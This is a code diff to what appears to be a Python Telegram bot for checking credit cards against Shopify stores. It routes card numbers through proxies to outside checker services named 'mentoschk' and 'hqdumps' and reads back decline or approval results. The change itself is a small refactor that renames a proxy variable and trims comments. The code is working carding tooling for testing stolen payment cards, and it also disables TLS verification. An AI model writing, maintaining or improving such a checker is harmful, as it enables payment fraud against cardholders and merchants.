@@ -174,20 +174,21 @@ def check_site_shopify_direct(site_url, cc, proxy=None):
     def call_api(api_base):
         try:
             clean_site = site_url.rstrip('/')
-            # Format proxy as host:port:user:pass
+            # Use a different variable name to avoid shadowing outer proxy
+            proxy_str = proxy
             api_proxy = ""
-            if proxy:
-                proxy = proxy.strip()
-                parts = proxy.split(':')
+            if proxy_str:
+                proxy_str = proxy_str.strip()
+                parts = proxy_str.split(':')
                 if len(parts) == 4:
-                    api_proxy = proxy
-                elif '@' in proxy:
-                    match = re.match(r'(?:http://)?([^:]+):([^@]+)@([^:]+):(\d+)', proxy)
+                    api_proxy = proxy_str
+                elif '@' in proxy_str:
+                    match = re.match(r'(?:http://)?([^:]+):([^@]+)@([^:]+):(\d+)', proxy_str)
                     if match:
                         user, password, host, port = match.groups()
                         api_proxy = f"{host}:{port}:{user}:{password}"
                 elif len(parts) == 2:
-                    api_proxy = proxy  # host:port only
+                    api_proxy = proxy_str  # host:port only
 
             encoded_cc = urllib.parse.quote(cc)
             encoded_proxy = urllib.parse.quote(api_proxy) if api_proxy else ""
@@ -205,18 +206,17 @@ def check_site_shopify_direct(site_url, cc, proxy=None):
             session = requests.Session()
             session.verify = False
             headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-            response = session.get(url, headers=headers, timeout=90)  # Increased timeout
+            response = session.get(url, headers=headers, timeout=90)
 
             if response.status_code != 200:
                 print(f"[API] {api_base} returned {response.status_code}")
                 return None
 
             data = response.json()
-            print(f"[API] {api_base} raw response: {data}")  # Debug print
+            print(f"[API] {api_base} raw response: {data}")
 
             # Normalize response to a common format
             if api_base == "mentoschk":
-                # Example: {"Gateway":"...","Price":...,"Response":"...","Status":...}
                 return {
                     'Response': data.get('Response', 'Unknown'),
                     'Price': str(data.get('Price', '0.00')),
@@ -224,10 +224,8 @@ def check_site_shopify_direct(site_url, cc, proxy=None):
                     'Status': data.get('Status', False)
                 }
             else:  # hqdumps
-                # Example: {"Response":"Card_Declined","Price":"1.0","Gate":"Shopify Payments",...}
-                # Note: hqdumps may not have a "Status" field – infer from Response text
                 resp_text = data.get('Response', 'Unknown')
-                # Assume Status True if response not explicitly an error
+                # Infer Status from response text (hqdumps doesn't send Status field)
                 status = False if 'UNABLE' in resp_text.upper() or 'FAILED' in resp_text.upper() else True
                 return {
                     'Response': resp_text,
@@ -1170,6 +1168,7 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
             bot.edit_message_text(msg, chat_id, mid, parse_mode='HTML')
         except:
             bot.send_message(chat_id, msg, parse_mode='HTML')
+
 
 
 
